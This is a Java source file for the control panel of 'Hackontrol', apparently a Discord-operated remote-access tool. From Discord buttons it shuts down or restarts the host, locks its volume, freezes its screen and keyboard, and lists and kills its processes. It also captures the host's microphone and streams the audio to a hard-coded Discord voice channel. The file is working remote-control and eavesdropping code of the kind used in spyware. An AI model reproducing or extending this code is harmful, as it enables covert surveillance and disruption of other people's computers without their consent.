package com.khopan.hackontrol.panel;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.ProcessEntry;
import com.khopan.hackontrol.library.Kernel;
import com.khopan.hackontrol.library.User;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.service.interaction.context.Question;
import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.LargeMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.ISendable;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.managers.AudioManager;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class ControlPanel extends Panel {
	private static final String PANEL_NAME = "control";

	private static final Button BUTTON_SLEEP                 = ButtonManager.staticButton(ButtonType.SECONDARY, "Sleep",        "sleep");
	private static final Button BUTTON_HIBERNATE             = ButtonManager.staticButton(ButtonType.SUCCESS,   "Hibernate",    "hibernate");
	private static final Button BUTTON_RESTART               = ButtonManager.staticButton(ButtonType.PRIMARY,   "Restart",      "restart");
	private static final Button BUTTON_SHUTDOWN              = ButtonManager.staticButton(ButtonType.DANGER,    "Shutdown",     "shutdown");

	private static final Button BUTTON_VOLUME                = ButtonManager.staticButton(ButtonType.SUCCESS,   "Volume",       "changeVolume");
	private static final Button BUTTON_MICROPHONE_CONNECT    = ButtonManager.staticButton(ButtonType.SUCCESS,   "Connect",      "connectMicrophone");
	private static final Button BUTTON_MICROPHONE_DISCONNECT = ButtonManager.staticButton(ButtonType.DANGER,    "Disconnect",   "disconnectMicrophone");
	private static final Button BUTTON_MUTE                  = ButtonManager.staticButton(ButtonType.SUCCESS,   "Mute",         "volumeMute");
	private static final Button BUTTON_UNMUTE                = ButtonManager.staticButton(ButtonType.DANGER,    "Unmute",       "volumeUnmute");
	private static final Button BUTTON_FORCE                 = ButtonManager.staticButton(ButtonType.SUCCESS,   "Force",        "volumeForce");
	private static final Button BUTTON_UNFORCE               = ButtonManager.staticButton(ButtonType.DANGER,    "Unforce",      "volumeUnforce");

	private static final Button BUTTON_SCREEN_FREEZE         = ButtonManager.staticButton(ButtonType.SUCCESS,   "Freeze",       "screenFreeze");
	private static final Button BUTTON_SCREEN_UNFREEZE       = ButtonManager.staticButton(ButtonType.DANGER,    "Unfreeze",     "screenUnfreeze");

	private static final Button BUTTON_PROCESS_LIST          = ButtonManager.staticButton(ButtonType.SUCCESS,   "Process List", "listProcess");
	private static final Button BUTTON_PROCESS_TERMINATE     = ButtonManager.staticButton(ButtonType.DANGER,    "Terminate",    "processTerminate");
	private static final Button BUTTON_PROCESS_REFRESH       = ButtonManager.staticButton(ButtonType.SUCCESS,   "Refresh",      "processRefresh");

	private static final String MODAL_CHANGE_VOLUME          = "modalVolumeChange";
	private static final String MODAL_TERMINATE_PROCESS      = "modalTerminateProcess";

	private volatile float volume;
	private volatile boolean volumeMute;
	private volatile boolean volumeForceMode;

	private SendHandler sendHandler;
	private AudioManager audioManager;

	@Override
	public String panelName() {
		return ControlPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SLEEP,                 context -> Question.positive(context.reply(), "Are you sure you want to sleep?",     QuestionType.YES_NO, Kernel :: sleep));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_HIBERNATE,             context -> Question.positive(context.reply(), "Are you sure you want to hibernate?", QuestionType.YES_NO, Kernel :: hibernate));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_RESTART,               context -> Question.positive(context.reply(), "Are you sure you want to restart?",   QuestionType.YES_NO, Kernel :: restart));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SHUTDOWN,              context -> Question.positive(context.reply(), "Are you sure you want to shutdown?",  QuestionType.YES_NO, Kernel :: shutdown));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_VOLUME,                context -> context.replyModal(Modal.create(ControlPanel.MODAL_CHANGE_VOLUME, "New Volume").addActionRow(TextInput.create("volume", "Volume", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(3).setPlaceholder("0 - 100").setValue(Integer.toString(Math.min(Math.max((int) Math.round(((double) (this.volumeForceMode ? this.volume : User.getMasterVolume())) * 100.0d), 0), 100))).build()).build()).queue());
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    context -> this.connect(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, context -> this.connect(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  context -> this.mute(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                context -> this.mute(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 context -> this.forceMode(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> this.forceMode(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.freeze(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.freeze(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_LIST,          this :: sendProcessList);
		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_TERMINATE,     context -> {
			ProcessEntry[] processList = Kernel.getProcessList();
			int minimumIdentifier = Integer.MAX_VALUE;
			int maximumIdentifier = Integer.MIN_VALUE;

			for(int i = 0; i < processList.length; i++) {
				minimumIdentifier = Math.min(minimumIdentifier, processList[i].processIdentifier);
				maximumIdentifier = Math.max(maximumIdentifier, processList[i].processIdentifier);
			}

			TextInput textInput = TextInput.create("processIdentifier", "Process Identifier", TextInputStyle.SHORT)
					.setRequired(true)
					.setMinLength(Integer.toString(minimumIdentifier).length())
					.setMaxLength(Integer.toString(maximumIdentifier).length())
					.setPlaceholder(minimumIdentifier + " - " + maximumIdentifier)
					.build();

			context.replyModal(Modal.create(ControlPanel.MODAL_TERMINATE_PROCESS, "Terminate Process").addActionRow(textInput).build()).queue();
		});

		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_REFRESH,       context -> {
			this.sendProcessList(context);
			HackontrolButton.deleteMessages(context);
		});

		this.register(Registration.MODAL,  ControlPanel.MODAL_CHANGE_VOLUME,          context -> {
			String text = context.getValue("volume").getAsString();
			int volumeLevel;

			try {
				volumeLevel = Integer.parseInt(text);
			} catch(Throwable Errors) {
				HackontrolError.message(context.reply(), "Invalid number format");
				return;
			}

			if(volumeLevel < 0 || volumeLevel > 100) {
				HackontrolError.message(context.reply(), "Volume out of bounds, expected 0 - 100");
				return;
			}

			float volume = ((float) volumeLevel) / 100.0f;

			if(this.volumeForceMode) {
				this.volume = volume;
			} else {
				User.setMasterVolume(volume);
			}

			context.deferEdit().queue();
		});

		this.register(Registration.MODAL,  ControlPanel.MODAL_TERMINATE_PROCESS,      context -> {
			String text = context.getValue("processIdentifier").getAsString();
			int processIdentifier;

			try {
				processIdentifier = Integer.parseInt(text);
			} catch(Throwable Errors) {
				HackontrolError.message(context.reply(), "Invalid number format");
				return;
			}

			if(processIdentifier == Kernel.getCurrentProcessIdentifier()) {
				HackontrolMessage.boldDeletable(context.reply(), "Due to security reason, terminating the Hackontrol process is not allowed");
				return;
			}

			TimeSafeReplyHandler.start(context, consumer -> this.terminateProcess(processIdentifier, consumer));
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.text("**Power**")
				.actionRow(ControlPanel.BUTTON_SLEEP, ControlPanel.BUTTON_HIBERNATE, ControlPanel.BUTTON_RESTART, ControlPanel.BUTTON_SHUTDOWN)
				.build(),
				ControlWidget.newBuilder()
				.text("**Sound**")
				.actionRow(ControlPanel.BUTTON_VOLUME)
				.actionRow(ControlPanel.BUTTON_MICROPHONE_CONNECT, ControlPanel.BUTTON_MICROPHONE_DISCONNECT)
				.actionRow(ControlPanel.BUTTON_MUTE, ControlPanel.BUTTON_UNMUTE)
				.actionRow(ControlPanel.BUTTON_FORCE, ControlPanel.BUTTON_UNFORCE)
				.build(),
				ControlWidget.newBuilder()
				.text("**Screen**")
				.actionRow(ControlPanel.BUTTON_SCREEN_FREEZE, ControlPanel.BUTTON_SCREEN_UNFREEZE)
				.build(),
				ControlWidget.newBuilder()
				.text("**Process**")
				.actionRow(ControlPanel.BUTTON_PROCESS_LIST, ControlPanel.BUTTON_PROCESS_TERMINATE)
				.build()
		};
	}

	@Override
	public void initialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
			if(!this.volumeForceMode) {
				return;
			}

			if(User.getMasterVolume() != this.volume) {
				User.setMasterVolume(this.volume);
			}

			if(User.isMute() != this.volumeMute) {
				User.setMute(this.volumeMute);
			}
		}, 0, 100, TimeUnit.MILLISECONDS);
	}

	private void connect(ButtonContext context, boolean connect) {
		if((this.sendHandler == null) != connect) {
			HackontrolMessage.boldDeletable(context.reply(), "Microphone is already " + (connect ? "connected" : "disconnected"));
			return;
		}

		Guild guild = context.getGuild();

		if(connect) {
			try {
				if(this.connectVoice(guild, context.reply(), true)) {
					context.deferEdit().queue();
				}
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}

			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disconnect?", QuestionType.YES_NO, () -> {
			try {
				this.connectVoice(guild, context.message(), false);
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}
		});
	}

	private boolean connectVoice(Guild guild, ISendable sender, boolean connect) throws Throwable {
		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.sendHandler != null) {
			this.sendHandler.close();
			this.sendHandler = null;
		}

		if(!connect) {
			return true;
		}

		VoiceChannel channel = guild.getVoiceChannelById(1257651662869368864L);

		if(channel == null) {
			List<VoiceChannel> list = guild.getVoiceChannels();

			if(!list.isEmpty()) {
				channel = list.get(0);
			}
		}

		if(channel == null) {
			HackontrolError.message(sender, "No voice channels were found");
			return false;
		}

		this.sendHandler = new SendHandler();
		this.audioManager.setSendingHandler(this.sendHandler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
		return true;
	}

	private void mute(ButtonContext context, boolean mute) {
		if((this.volumeForceMode ? this.volumeMute : User.isMute()) == mute) {
			HackontrolMessage.boldDeletable(context.reply(), "Volume is already " + (mute ? "muted" : "unmuted"));
			return;
		}

		if(!mute) {
			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> User.setMute(this.volumeMute = false));
			return;
		}

		User.setMute(this.volumeMute = true);
		context.deferEdit().queue();
	}

	private void forceMode(ButtonContext context, boolean enable) {
		if(this.volumeForceMode == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.volumeForceMode = false);
			return;
		}

		this.volume = User.getMasterVolume();
		this.volumeMute = User.isMute();
		this.volumeForceMode = true;
		context.deferEdit().queue();
	}

	private void freeze(ButtonContext context, boolean freeze) {
		if(KeyboardHandler.Freeze == freeze) {
			HackontrolMessage.boldDeletable(context.reply(), "The screen is already " + (freeze ? "frozen" : "unfrozen"));
			return;
		}

		if(!freeze) {
			Question.positive(context.reply(), "Are you sure you want to unfreeze the screen?", QuestionType.YES_NO, () -> Kernel.setFreeze(KeyboardHandler.Freeze = false));
			return;
		}

		Kernel.setFreeze(KeyboardHandler.Freeze = true);
		context.deferEdit().queue();
	}

	private void sendProcessList(IReplyCallback callback) {
		List<ProcessEntry> processList = new ArrayList<>();
		processList.addAll(List.of(Kernel.getProcessList()));
		processList.sort((x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile));
		int longestIdentifierLength = 0;

		for(int i = 0; i < processList.size(); i++) {
			longestIdentifierLength = Math.max(longestIdentifierLength, Integer.toString(processList.get(i).processIdentifier).length());
		}

		longestIdentifierLength += 3;
		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();
		StringBuilder builder = new StringBuilder();

		for(int x = 0; x < processList.size(); x++) {
			ProcessEntry entry = processList.get(x);

			if(x > 0) {
				builder.append('\n');
			}

			builder.append('`');
			builder.append(entry.processIdentifier);

			for(int y = 0; y < longestIdentifierLength - Integer.toString(entry.processIdentifier).length(); y++) {
				builder.append(' ');
			}

			builder.append(entry.executableFile);

			if(entry.processIdentifier == currentProcessIdentifier) {
				builder.append(" (Current Process)");
			}

			builder.append('`');
		}

		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> request.addActionRow(ControlPanel.BUTTON_PROCESS_REFRESH, ControlPanel.BUTTON_PROCESS_TERMINATE, HackontrolButton.delete(identifiers)));
	}

	private void terminateProcess(int processIdentifier, Consumer<MessageCreateData> consumer) {
		ProcessEntry[] processList = Kernel.getProcessList();
		List<Integer> killList = new ArrayList<>();
		killList.add(processIdentifier);

		for(int i = 0; i < processList.length; i++) {
			ProcessEntry entry = processList[i];

			if(entry.parentProcessIdentifier == processIdentifier) {
				killList.add(entry.processIdentifier);
			}
		}

		int size = killList.size();

		for(int i = 0; i < size; i++) {
			Kernel.terminateProcess(killList.get(i));
		}

		HackontrolMessage.boldDeletable(ConsumerMessageCreateDataSendable.of(consumer), "Successfully terminate " + size + " process" + (size == 1 ? "" : "es"));
	}

	private class SendHandler implements AudioSendHandler {
		private final TargetDataLine line;
		private final AudioInputStream stream;
		private final int size;

		private volatile boolean open;

		private SendHandler() throws Throwable {
			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
			this.line = (TargetDataLine) AudioSystem.getLine(info);
			this.line.open();
			this.line.start();
			this.stream = new AudioInputStream(this.line);
			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			this.open = true;
		}

		@Override
		public boolean canProvide() {
			return this.open;
		}

		@Override
		public ByteBuffer provide20MsAudio() {
			try {
				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
			} catch(Throwable Errors) {
				return ByteBuffer.allocate(0);
			}
		}

		private void close() throws Throwable {
			this.open = false;
			this.line.stop();
			this.line.close();
			this.stream.close();
		}
	}
}
